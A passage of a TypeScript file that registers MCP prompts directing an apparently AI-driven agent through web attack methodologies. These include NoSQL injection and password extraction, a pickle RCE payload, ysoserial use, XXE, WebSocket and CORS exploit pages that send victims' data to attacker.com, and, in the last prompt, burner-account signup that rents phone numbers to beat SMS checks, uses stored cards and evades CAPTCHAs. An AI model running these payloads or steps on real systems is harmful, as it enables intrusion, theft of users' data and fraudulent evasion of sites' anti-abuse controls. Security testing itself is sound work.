{"username": {"$gt": ""}, "password": {"$gt": ""}}
\`\`\`

If the login returns a valid session, the auth bypass is confirmed.

## Step 3: Data Extraction via Regex

### 3a. Enumerate usernames
\`\`\`json
// Find users starting with 'a'
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
// Then: ^ad, ^adm, ^admi, ^admin — character by character
\`\`\`

### 3b. Extract passwords character-by-character
\`\`\`json
// Password starts with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}
// Password starts with 'ab'?
{"username": "admin", "password": {"$regex": "^ab"}}
\`\`\`
Binary search approach: Use character ranges to speed up:
\`\`\`json
{"username": "admin", "password": {"$regex": "^[a-m]"}}   // Is first char a-m?
{"username": "admin", "password": {"$regex": "^[a-f]"}}   // Narrow down...
\`\`\`

### 3c. Determine password length
\`\`\`json
{"username": "admin", "password": {"$regex": "^.{1}$"}}   // Length 1?
{"username": "admin", "password": {"$regex": "^.{8}$"}}   // Length 8?
{"username": "admin", "password": {"$regex": "^.{1,8}$"}} // Length 1-8?
\`\`\`

## Step 4: Category/Filter Injection
For non-auth endpoints that use MongoDB queries (e.g., product filters):
\`\`\`
# Original request
GET ${target_url}/products?category=Gifts

# Inject to match ALL categories
GET ${target_url}/products?category[$ne]=invalid

# Inject to reveal hidden/restricted categories
GET ${target_url}/products?category[$regex]=.*

# Inject to get products from all categories
GET ${target_url}/products?category[$gt]=
\`\`\`

## Step 5: JavaScript Injection ($where)
MongoDB's $where operator executes JavaScript:
\`\`\`json
// Detect JavaScript injection
{"$where": "this.${parameter} == 'test'"}

// Time-based detection
{"$where": "sleep(5000) || this.${parameter} == 'test'"}

// Extract data via conditional sleep
{"$where": "if(this.password.charAt(0)=='a'){sleep(5000)}"}

// Boolean-based extraction
{"$where": "this.username=='admin' && this.password.charAt(0)=='a'"}
\`\`\`

## Step 6: Server-Side JavaScript Injection
If the application uses \`eval()\` or \`Function()\` with user input in a Node.js/MongoDB context:
\`\`\`
// Break out of string context
';return true;//
';return this.password;//

// Data extraction
';return JSON.stringify(this);//
\`\`\`

## Verification
1. For auth bypass: Confirm you receive a valid session and can access authenticated pages.
2. For data extraction: Confirm extracted passwords/data by logging in with them.
3. For category injection: Confirm hidden data is revealed that shouldn't be accessible.
4. Document the exact JSON payload, the endpoint, and what was extracted.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 19. deserialization_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "deserialization_methodology",
    "Insecure deserialization testing — PHP serialized objects, type juggling, Java/Python deserialization, cookie manipulation.",
    {
      target_url: z.string().describe("Target URL to test"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Insecure Deserialization Testing Methodology

**Target:** ${target_url}

## Step 1: Identify Serialized Data
Run \`deserialization_test("${target_url}", "session")\` — Check cookies for serialized objects.

### What to look for in cookies/parameters
- **PHP serialize**: \`O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:0;}\`
  - Pattern: Starts with \`O:\`, \`a:\`, \`s:\`, \`i:\`, \`b:\`
- **Base64-encoded PHP**: Decode base64, check for PHP serialize format.
- **Java serialized**: Starts with \`\\xac\\xed\\x00\\x05\` (hex: \`aced0005\`), or base64 of same.
- **Python pickle**: Base64-encoded, may start with \`\\x80\\x04\\x95\` or \`gASV\`.
- **.NET ViewState**: \`__VIEWSTATE\` parameter, base64-encoded.
- **JSON**: May be base64-encoded in cookies.

## Step 2: PHP Serialized Object Manipulation

### 2a. Privilege escalation via field modification
If cookie contains serialized User object:
\`\`\`
Original:   O:4:"User":2:{s:8:"username";s:5:"james";s:5:"admin";b:0;}
Modified:   O:4:"User":2:{s:8:"username";s:5:"james";s:5:"admin";b:1;}
\`\`\`
Change \`b:0\` (false) to \`b:1\` (true) to set admin=true.

Base64 encode the modified serialization and set it as the cookie:
\`\`\`
curl -sk "${target_url}/admin" \\
  -b "session=BASE64_ENCODED_MODIFIED_SERIALIZATION"
\`\`\`

### 2b. Delete/add fields
\`\`\`
# Add an "admin" field that doesn't exist in the original
O:4:"User":3:{s:8:"username";s:5:"james";s:5:"admin";b:1;s:4:"role";s:5:"admin";}
\`\`\`

## Step 3: PHP Type Juggling
PHP's loose comparison (\`==\`) has dangerous edge cases:

### Integer 0 vs String comparison
In PHP: \`0 == "any_string"\` evaluates to TRUE (loose comparison).
If the app compares an access token with \`==\`:
\`\`\`
Original:   s:12:"access_token";s:32:"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6";
Modified:   s:12:"access_token";i:0;
\`\`\`
The \`i:0\` (integer 0) will loosely equal any string token.

### Boolean true vs String
\`true == "any_string"\` evaluates to TRUE in PHP loose comparison:
\`\`\`
s:12:"access_token";b:1;
\`\`\`

## Step 4: PHP Object Injection (Magic Methods)
If the application has classes with dangerous magic methods:
- \`__wakeup()\` — called on unserialize()
- \`__destruct()\` — called when object is garbage collected
- \`__toString()\` — called when object is used as string

Craft a serialized object of a class that has a dangerous magic method:
\`\`\`php
// If there's a class with __destruct() that deletes a file:
// class TempFile { public $path; function __destruct() { unlink($this->path); } }
O:8:"TempFile":1:{s:4:"path";s:11:"/etc/passwd";}

// If there's a class with __toString() that reads a file:
// class Logger { public $file; function __toString() { return file_get_contents($this->file); } }
O:6:"Logger":1:{s:4:"file";s:11:"/etc/passwd";}
\`\`\`

## Step 5: Java Deserialization
If the application uses Java serialization:
1. Look for base64 cookies that decode to bytes starting with \`\\xac\\xed\`.
2. Use ysoserial to generate payloads:
\`\`\`
java -jar ysoserial.jar CommonsCollections1 'id' | base64
\`\`\`
3. Send the payload in the serialized cookie/parameter.

## Step 6: Python Pickle Deserialization
If the application uses Python pickle:
\`\`\`python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
\`\`\`

## Verification
1. For PHP serialization: Confirm privilege escalation by accessing admin pages after cookie modification.
2. For type juggling: Confirm that the \`i:0\` or \`b:1\` trick grants access.
3. For RCE via deserialization: Confirm command execution output.
4. Document the original serialized value, the modification, and the result.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 20. api_testing_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "api_testing_methodology",
    "API security testing — documentation discovery, hidden endpoint enumeration, method exploitation, mass assignment.",
    {
      target_url: z.string().describe("Base URL of the target API (e.g., https://target.com)"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# API Security Testing Methodology

**Target:** ${target_url}

## Step 1: API Documentation Discovery
Check for exposed API documentation endpoints:
\`\`\`
# Swagger / OpenAPI
curl -sk "${target_url}/swagger.json"
curl -sk "${target_url}/swagger/v1/swagger.json"
curl -sk "${target_url}/api-docs"
curl -sk "${target_url}/api/swagger.json"
curl -sk "${target_url}/openapi.json"
curl -sk "${target_url}/v1/api-docs"
curl -sk "${target_url}/v2/api-docs"
curl -sk "${target_url}/v3/api-docs"

# GraphQL
curl -sk "${target_url}/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'
curl -sk "${target_url}/graphql/console"

# Framework-specific
curl -sk "${target_url}/.well-known/openid-configuration"
curl -sk "${target_url}/api/abp/api-definition"       # ABP Framework
curl -sk "${target_url}/actuator"                       # Spring Boot
curl -sk "${target_url}/actuator/mappings"              # Spring Boot endpoints
curl -sk "${target_url}/_catalog"                       # Docker Registry
curl -sk "${target_url}/api/v1/namespaces"             # Kubernetes
\`\`\`

## Step 2: Endpoint Enumeration from JS Bundles
Download and search JavaScript bundles for API endpoints:
\`\`\`
# Find JS files
curl -sk "${target_url}" | grep -oP 'src="[^"]*\\.js"' | sed 's/src="//;s/"//'

# Search for API paths
# Look for: fetch(), axios, XMLHttpRequest, $.ajax, http.get/post
# Patterns: "/api/", "/v1/", "/v2/", baseURL, apiUrl, endpoint
\`\`\`
Run \`recon_directory_bruteforce("${target_url}/api")\` to discover undocumented endpoints.

## Step 3: HTTP Method Discovery
For each discovered endpoint, enumerate allowed methods:
\`\`\`
# OPTIONS request reveals allowed methods
curl -sk -X OPTIONS "${target_url}/api/users" -D - -o /dev/null

# Try each method
curl -sk -X GET "${target_url}/api/users/1" -w "%{http_code}"
curl -sk -X POST "${target_url}/api/users" -w "%{http_code}" -H "Content-Type: application/json" -d '{}'
curl -sk -X PUT "${target_url}/api/users/1" -w "%{http_code}" -H "Content-Type: application/json" -d '{}'
curl -sk -X PATCH "${target_url}/api/users/1" -w "%{http_code}" -H "Content-Type: application/json" -d '{}'
curl -sk -X DELETE "${target_url}/api/users/1" -w "%{http_code}"
\`\`\`

## Step 4: Hidden Method Exploitation
Some REST APIs expose dangerous operations on common endpoints:

### PATCH for partial updates (mass assignment)
\`\`\`
# Normal user update
PATCH /api/users/me
{"name": "New Name"}

# Try adding privileged fields
PATCH /api/users/me
{"name": "New Name", "role": "admin", "is_admin": true, "credits": 99999}
\`\`\`

### DELETE for resource removal
\`\`\`
# Can a regular user delete other users' resources?
DELETE /api/users/OTHER_USER_ID
DELETE /api/posts/OTHER_POST_ID
\`\`\`

### PUT for full replacement (may bypass field validation)
\`\`\`
# PUT replaces the entire resource — missing validation?
PUT /api/users/me
{"name": "Admin", "role": "admin", "email": "admin@evil.com"}
\`\`\`

## Step 5: API Versioning Exploitation
\`\`\`
# If /api/v2/users has auth, try older versions
curl -sk "${target_url}/api/v1/users" -w "%{http_code}"
curl -sk "${target_url}/api/users" -w "%{http_code}"

# Try newer/non-existent versions (may have debug mode)
curl -sk "${target_url}/api/v3/users" -w "%{http_code}"
\`\`\`

## Step 6: Content-Type Manipulation
\`\`\`
# If JSON is expected, try XML (XXE)
curl -sk -X POST "${target_url}/api/login" \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><username>&xxe;</username></root>'

# Try x-www-form-urlencoded instead of JSON
curl -sk -X POST "${target_url}/api/login" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d 'username=admin&password=test'
\`\`\`

## Step 7: Rate Limiting Verification
\`\`\`
# Send 20 concurrent requests to auth endpoints
for i in $(seq 1 20); do
  curl -sk -X POST "${target_url}/api/auth/login" \\
    -H "Content-Type: application/json" \\
    -d '{"email":"test@test.com","password":"wrong'$i'"}' \\
    -w "%{http_code}" -o /dev/null &
done
wait
\`\`\`
Check for X-RateLimit-* headers. No rate limiting on auth = credential stuffing vulnerability.

## Step 8: GraphQL-Specific Testing
If a GraphQL endpoint is found:
1. Run \`graphql_introspect\` to dump the full schema.
2. Run \`graphql_find_hidden\` to discover sensitive fields.
3. Test for batching attacks:
\`\`\`json
[
  {"query": "mutation { login(user: \\"admin\\", pass: \\"pass1\\") { token } }"},
  {"query": "mutation { login(user: \\"admin\\", pass: \\"pass2\\") { token } }"},
  {"query": "mutation { login(user: \\"admin\\", pass: \\"pass3\\") { token } }"}
]
\`\`\`
Sending multiple mutations in one request may bypass rate limiting.

## Verification
1. For each discovered endpoint: Confirm auth requirements (or lack thereof).
2. For method exploitation: Confirm the action was performed (data modified, resource deleted).
3. For mass assignment: Confirm the privileged field was actually set.
4. Document all discovered endpoints, their methods, and any security issues found.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 21. websocket_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "websocket_methodology",
    "WebSocket security testing — authentication bypass, message manipulation, cross-site WebSocket hijacking.",
    {
      target_url: z.string().describe("Target URL of the application"),
      ws_endpoint: z.string().describe("WebSocket endpoint path (e.g., /ws, /chat, /hub, /signalr)"),
    },
    ({ target_url, ws_endpoint }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# WebSocket Security Testing Methodology

**Target:** ${target_url}
**WebSocket Endpoint:** ${ws_endpoint}

## Step 1: Identify WebSocket Technology
1. Check for SignalR: Look for \`/signalr\`, \`/hub\`, negotiate endpoint patterns.
2. Check for Socket.IO: Look for \`/socket.io/\`, transport=websocket parameters.
3. Check for raw WebSocket: \`ws://\` or \`wss://\` connections.
4. Inspect JS bundles for WebSocket client code to understand the protocol.

## Step 2: Authentication Testing

### 2a. Negotiate endpoint without auth
For SignalR/Socket.IO, test the negotiate/handshake endpoint without authentication:
\`\`\`
# SignalR negotiate
curl -sk -X POST "${target_url}${ws_endpoint}/negotiate" -w "%{http_code}"
curl -sk -X POST "${target_url}${ws_endpoint}/negotiate" -H "Content-Type: application/json" -d '{}'

# Socket.IO handshake
curl -sk "${target_url}/socket.io/?transport=polling" -w "%{http_code}"
\`\`\`
If negotiate succeeds without auth, the WebSocket connection may also work without auth.

### 2b. WebSocket connection without auth
Attempt to establish a WebSocket connection without cookies/tokens:
\`\`\`javascript
// In browser console or Node.js
const ws = new WebSocket('wss://${target_url.replace(/^https?:\/\//, '')}${ws_endpoint}');
ws.onopen = () => console.log('Connected without auth!');
ws.onmessage = (e) => console.log('Received:', e.data);
ws.onerror = (e) => console.log('Error:', e);
\`\`\`

### 2c. Connection-level vs method-level auth
Even if the connection requires auth, individual hub methods may not enforce authorization:
\`\`\`javascript
// Connect with valid auth, then invoke methods for other users
ws.send(JSON.stringify({
  type: 'invoke',
  target: 'GetUserData',
  arguments: ['OTHER_USER_ID']
}));
\`\`\`

## Step 3: Message Manipulation

### 3a. Bypass client-side encoding
The web client may HTML-encode messages before sending. The WebSocket protocol itself doesn't enforce this. Send raw unencoded messages directly:
\`\`\`javascript
// Client sends: {"message": "&lt;script&gt;alert(1)&lt;/script&gt;"}
// Send directly: {"message": "<script>alert(1)</script>"}
ws.send(JSON.stringify({
  message: '<img src=x onerror=alert(document.cookie)>'
}));
\`\`\`
If the server doesn't re-encode, and the message is displayed to other users, this is stored XSS via WebSocket.

### 3b. SQL injection via WebSocket
\`\`\`javascript
ws.send(JSON.stringify({
  action: 'search',
  query: "' OR 1=1-- -"
}));
\`\`\`

### 3c. Command injection via WebSocket
\`\`\`javascript
ws.send(JSON.stringify({
  action: 'ping',
  host: '127.0.0.1; id'
}));
\`\`\`

## Step 4: Cross-Site WebSocket Hijacking (CSWSH)
WebSocket connections don't follow the same-origin policy — they rely on the Origin header, which the server must validate.

### 4a. Test Origin validation
\`\`\`javascript
// From attacker's page, connect to victim's WebSocket
const ws = new WebSocket('wss://${target_url.replace(/^https?:\/\//, '')}${ws_endpoint}');
// Browser automatically sends cookies for the target domain
// If the server doesn't validate Origin, the connection succeeds with the victim's session
\`\`\`

### 4b. Full CSWSH exploit
Host on attacker's server:
\`\`\`html
<html>
<script>
  var ws = new WebSocket('wss://${target_url.replace(/^https?:\/\//, '')}${ws_endpoint}');
  ws.onopen = function() {
    // Request sensitive data using victim's authenticated session
    ws.send(JSON.stringify({action: 'getProfile'}));
  };
  ws.onmessage = function(event) {
    // Exfiltrate the response
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
  };
</script>
</html>
\`\`\`
When the victim visits this page while authenticated, the attacker gets their WebSocket data.

## Step 5: Transport-Layer Testing

### 5a. Downgrade from WSS to WS
If the application uses wss:// (encrypted), try connecting via ws:// (unencrypted):
\`\`\`javascript
const ws = new WebSocket('ws://${target_url.replace(/^https?:\/\//, '')}${ws_endpoint}');
\`\`\`
If the server accepts unencrypted connections, all WebSocket traffic can be intercepted.

### 5b. Long-polling fallback
SignalR and Socket.IO fall back to long-polling HTTP. Test the HTTP transport for the same vulnerabilities:
\`\`\`
curl -sk "${target_url}${ws_endpoint}?transport=longPolling&connectionId=..." \\
  -H "Cookie: session=..."
\`\`\`

## Step 6: Rate Limiting and DoS
\`\`\`javascript
// Flood the WebSocket with messages
const ws = new WebSocket('wss://${target_url.replace(/^https?:\/\//, '')}${ws_endpoint}');
ws.onopen = () => {
  for (let i = 0; i < 1000; i++) {
    ws.send(JSON.stringify({message: 'flood ' + i}));
  }
};
\`\`\`
Check if the server enforces message rate limiting.

## Verification
1. For auth bypass: Confirm you can receive/send data without valid credentials.
2. For message manipulation: Confirm the payload executes on other users' screens.
3. For CSWSH: Confirm the attacker page can read authenticated WebSocket data.
4. Document the exact WebSocket frames sent and received.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 22. cors_methodology (NEW)
  // ---------------------------------------------------------------------------
  server.prompt(
    "cors_methodology",
    "CORS misconfiguration testing — origin reflection, null origin bypass, trusted subdomain exploitation, credential leakage.",
    {
      target_url: z.string().describe("Target URL of the API endpoint to test"),
    },
    ({ target_url }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# CORS Misconfiguration Testing Methodology

**Target:** ${target_url}

## Step 1: Automated Testing
Run \`cors_test("${target_url}", "/api/me")\` — Tests 8 origin variations automatically.

## Step 2: Origin Reflection Testing
Send requests with various Origin headers and check Access-Control-Allow-Origin (ACAO) and Access-Control-Allow-Credentials (ACAC):

\`\`\`
# Arbitrary origin
curl -sk "${target_url}" -H "Origin: https://evil-attacker.com" -D - -o /dev/null

# Check for: Access-Control-Allow-Origin: https://evil-attacker.com
# Check for: Access-Control-Allow-Credentials: true
# If BOTH are present → CRITICAL: Any site can read authenticated API responses.
\`\`\`

### Test variations
\`\`\`
# Null origin (sandboxed iframes, file:// protocol)
curl -sk "${target_url}" -H "Origin: null" -D - -o /dev/null

# Subdomain of target
curl -sk "${target_url}" -H "Origin: https://evil.${target_url.replace(/^https?:\/\//, '').split('/')[0]}" -D - -o /dev/null

# Target as prefix
curl -sk "${target_url}" -H "Origin: https://${target_url.replace(/^https?:\/\//, '').split('/')[0]}.evil.com" -D - -o /dev/null

# Target as suffix
curl -sk "${target_url}" -H "Origin: https://evil-${target_url.replace(/^https?:\/\//, '').split('/')[0]}" -D - -o /dev/null

# HTTP downgrade
curl -sk "${target_url}" -H "Origin: http://${target_url.replace(/^https?:\/\//, '').split('/')[0]}" -D - -o /dev/null

# Localhost
curl -sk "${target_url}" -H "Origin: http://localhost" -D - -o /dev/null
\`\`\`

## Step 3: Trusted Null Origin Exploitation
If the server trusts Origin: null with credentials:
\`\`\`html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    fetch('${target_url}', {credentials: 'include'})
      .then(r => r.json())
      .then(data => {
        // Exfiltrate to attacker server
        fetch('https://attacker.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
  </script>
"></iframe>
\`\`\`
Sandboxed iframes send \`Origin: null\`. If the server returns \`ACAO: null\` with \`ACAC: true\`, the sandboxed page can read the response.

## Step 4: ACAO with Credentials Exploitation
If the server reflects the Origin and includes \`Access-Control-Allow-Credentials: true\`:
\`\`\`html
<html>
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    // Send stolen data to attacker
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(this.responseText));
  };
  req.open('GET', '${target_url}', true);
  req.withCredentials = true;
  req.send();
</script>
</html>
\`\`\`
When a victim visits this page, the browser sends their cookies to the target API, and the response is readable by the attacker's script.

## Step 5: Subdomain Trust Exploitation
If the server trusts any subdomain (\`*.target.com\`):
1. Find XSS on ANY subdomain (blog.target.com, staging.target.com, etc.).
2. Use the XSS to make cross-origin requests to the main API.
3. Since the origin is a trusted subdomain, CORS allows it.
\`\`\`javascript
// XSS payload on subdomain.target.com
fetch('https://api.target.com/api/me', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify(data)});
  });
\`\`\`

## Step 6: Preflight Request Analysis
For non-simple requests (custom headers, non-GET/POST methods):
\`\`\`
# Preflight request
curl -sk -X OPTIONS "${target_url}" \\
  -H "Origin: https://evil.com" \\
  -H "Access-Control-Request-Method: PUT" \\
  -H "Access-Control-Request-Headers: Authorization, Content-Type" \\
  -D - -o /dev/null
\`\`\`
Check \`Access-Control-Allow-Methods\` and \`Access-Control-Allow-Headers\` in the response.

## Step 7: Impact Assessment
CORS misconfigurations are only exploitable if:
1. The response contains sensitive data (API keys, user data, CSRF tokens).
2. \`Access-Control-Allow-Credentials: true\` is set (needed for cookie-authenticated requests).
3. The ACAO is not a wildcard \`*\` (browsers block \`*\` + credentials).

Severity guide:
- **Critical**: Arbitrary origin reflected + credentials + sensitive data in response.
- **High**: Null origin trusted + credentials + sensitive data.
- **Medium**: Subdomain wildcard + credentials (requires XSS on any subdomain).
- **Low**: Arbitrary origin reflected but NO credentials (can't steal authenticated data).
- **Info**: Wildcard \`*\` without credentials (intentional for public APIs).

## Verification
1. Host the exploit HTML on a different origin.
2. Authenticate as a test user in the browser.
3. Visit the exploit page — confirm the API response is captured.
4. Document exactly which Origin values are trusted and whether credentials are included.`,
          },
        },
      ],
    })
  );

  // ---------------------------------------------------------------------------
  // 23. authenticated_recon_methodology
  // ---------------------------------------------------------------------------
  server.prompt(
    "authenticated_recon_methodology",
    "Full authenticated reconnaissance methodology — account creation, verification bypass, session harvesting, and endpoint mapping",
    { target: z.string().describe("Target application URL") },
    ({ target }) => ({
      messages: [
        {
          role: "user" as const,
          content: {
            type: "text" as const,
            text: `# Authenticated Reconnaissance Methodology

**Target:** ${target}

## Step 1: Credential Provisioning
1. Check Bitwarden for existing credentials for the target domain.
2. Unlock vault: \`export BW_SESSION=$(bw unlock --passwordenv BW_MASTER_PASSWORD --raw)\`
3. Search for existing creds: \`bw list items --search "${target.replace(/^https?:\/\//, '').split('/')[0]}" --session "$BW_SESSION"\`
4. If none found: generate a realistic burner identity (realistic names — not test/hacker identifiers).
5. Generate a strong password: \`bw generate --length 20 --special --session "$BW_SESSION"\`

## Step 2: Account Registration
1. Navigate to the signup page on ${target}.
2. Fill the registration form with your burner identity.
3. Handle verification gates:
   - **Email verification**: Access burner email inbox, find confirmation email, click the verification link.
   - **Phone verification** via TextVerified.com API:
     - Check available services: \`GET https://www.textverified.com/api/Targets\` with header \`X-SIMPLE-API-ACCESS-TOKEN: {api_key}\`
     - Rent a number: \`POST https://www.textverified.com/api/Verifications\` with body \`{"id": "{service_id}"}\`
     - Enter the rented phone number in the signup form.
     - Poll for SMS code: \`GET https://www.textverified.com/api/Verifications/{id}\` — returns \`smsContent\` when received.
     - Enter the verification code in the form.
   - **Payment wall**: Use card data stored in Bitwarden for trial/free tier signup. Always check if a free tier exists first.
   - **CAPTCHA**: Use anti-fingerprint browser. If stuck, flag to the user for manual intervention.
   - **Invitation-only**: Stop and report to the user — cannot proceed without an invite.

## Step 3: Account Hardening
1. Navigate to security settings and enable TOTP 2FA on the target account.
2. Extract the TOTP secret:
   - Look for \`otpauth://\` URI in QR code \`data:\` attribute or canvas element.
   - Or copy the text secret (usually displayed as groups of 4 characters).
3. Generate a TOTP code to confirm setup:
   - \`oathtool --totp -b "{secret}"\`
   - Or: \`python3 -c "import pyotp; print(pyotp.TOTP('{secret}').now())"\`
4. Confirm 2FA setup in the application and save any recovery codes.
5. Store everything in Bitwarden SecurityTesting folder:
   - Create folder: \`echo '{"name":"SecurityTesting"}' | bw encode | bw create folder --session "$BW_SESSION"\`
   - Create item with login.totp field: \`bw create item\` (include username, password, URI, TOTP secret).
   - Add TOTP secret and recovery codes in notes: \`bw get item {id} | jq '.login.totp = "{secret}"' | bw encode | bw edit item {id} --session "$BW_SESSION"\`

## Step 4: Login & Session Harvest
1. Login to ${target} with credentials + TOTP code from Bitwarden:
   - Get TOTP code: \`bw get totp "{item_id}" --session "$BW_SESSION"\`
2. Once authenticated, extract all session material:
   - **Cookies**: All cookies for the domain (especially session, auth, CSRF cookies).
   - **localStorage**: Scan for JWTs, access tokens, refresh tokens, API keys.
   - **sessionStorage**: Scan for access tokens, auth tokens.
   - **Authorization headers**: Intercept network requests to capture Bearer tokens, API keys in headers.
3. Save session bundle as JSON:
\`\`\`json
{
  "target": "${target}",
  "cookies": [{"name": "...", "value": "...", "domain": "...", "path": "/", "httpOnly": true, "secure": true}],
  "localStorage": {"key": "value"},
  "sessionStorage": {"key": "value"},
  "headers": {"Authorization": "Bearer ...", "X-CSRF-Token": "..."},
  "csrf_token": "...",
  "account": {"email": "...", "has_2fa": true},
  "harvested_at": "ISO8601"
}
\`\`\`

## Step 5: Authenticated Endpoint Discovery
1. Crawl all authenticated app sections: dashboard, settings, profile, admin panels, billing.
2. Intercept every network request: capture URL, method, parameters, and auth headers.
3. Identify attack candidates in the endpoint map:
   - **ID parameters** → IDOR candidates (e.g., \`/api/users/123\`, \`/api/orders/456\`)
   - **State-changing endpoints** → CSRF candidates (POST/PUT/DELETE without CSRF tokens)
   - **File upload endpoints** → Upload bypass, path traversal, malicious file execution
   - **Admin endpoints** → Privilege escalation, horizontal/vertical access control
   - **GraphQL endpoints** → Introspection, query depth attacks, batch queries
   - **WebSocket connections** → Message injection, auth bypass, origin validation
4. Output a structured endpoint map:
\`\`\`json
{
  "endpoints": [
    {"url": "/api/...", "method": "GET", "params": ["id"], "auth_type": "Bearer", "idor_candidate": true, "csrf_required": false}
  ],
  "websockets": ["wss://..."],
  "graphql_endpoint": "/graphql",
  "total_discovered": 0
}
\`\`\`

## Step 6: Handoff
1. Save the session bundle JSON and endpoint map to files in the working directory.
2. Report summary: account status, 2FA status, token types found, total endpoint count.
3. Provide session bundle format for curl-based attack agents:
\`\`\`bash
# Bearer token auth
curl -H "Authorization: Bearer {token}" -H "Cookie: session={value}" ${target}/api/endpoint

# Cookie-only auth
curl -b "session=abc123; csrf=xyz789" ${target}/api/endpoint

# Both + CSRF header
curl -b "session=abc123" -H "X-CSRF-Token: xyz789" -X POST ${target}/api/settings -d '{"key":"value"}'
\`\`\`

## Step 7: Verification
1. Verify the session is still valid — make a request to an authenticated endpoint and confirm a 200 response.
2. Verify TOTP works — generate a fresh code with \`bw get totp "{item_id}" --session "$BW_SESSION"\` and validate it.
3. Document any signup restrictions, rate limits, or anti-automation measures encountered during registration.
4. Confirm the endpoint map is complete — compare discovered endpoints against visible UI navigation.`,
          },
        },
      ],
    })
  );
}
